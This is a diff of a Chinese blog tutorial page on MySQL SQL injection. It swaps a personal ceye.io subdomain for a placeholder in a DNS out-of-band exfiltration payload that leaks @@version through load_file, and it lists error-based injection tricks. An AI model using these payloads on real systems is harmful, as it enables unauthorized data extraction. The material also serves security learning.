@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="K4ng&#39;s blog">
 <meta property="og:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入">
 <meta property="og:image" content="https://i.imgur.com/hI1cy2y.png">
-<meta property="og:updated_time" content="2018-08-24T07:00:43.589Z">
+<meta property="og:updated_time" content="2018-08-24T07:02:11.362Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈SQLi">
 <meta name="twitter:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入">
@@ -339,7 +339,7 @@
 </blockquote>
 <p>利用VPS或者 <a href="http://ceye.io/records/dns" target="_blank" rel="external">http://ceye.io/records/dns</a> 提供的 DNS Query 来获取dnslog中的数据。</p>
 <p>Windows环境下，在MySql中可通过 <code>load_file()</code> 来发送 dns 查询。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="string">'.pzkvas.ceye.io\\abc'</span>));</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="string">'.your_code.ceye.io\\abc'</span>));</div></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/hI1cy2y.png" alt=""></p>
 <h2 id="0x05-Tricks"><a href="#0x05-Tricks" class="headerlink" title="0x05 Tricks"></a>0x05 Tricks</h2><h3 id="a-concat过滤下使用updatexml报错注入"><a href="#a-concat过滤下使用updatexml报错注入" class="headerlink" title="a. concat过滤下使用updatexml报错注入"></a>a. <code>concat</code>过滤下使用updatexml报错注入</h3><p>当concat函数被过滤且需要使用updatexml来报错注入时，可找类似函数，如lpad()、reverse()、repeat()、export_set()。（lpad()、reverse()、repeat() 这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据）。</p>
 <h3 id="b-linestring-爆当前表名"><a href="#b-linestring-爆当前表名" class="headerlink" title="b. linestring()爆当前表名"></a>b. <code>linestring()</code>爆当前表名</h3><p>通过<code>polygon()</code>和<code>linestring()</code>可爆出当前表名。还有<code>multipoint、multilinestring、multipolygon</code>：</p>
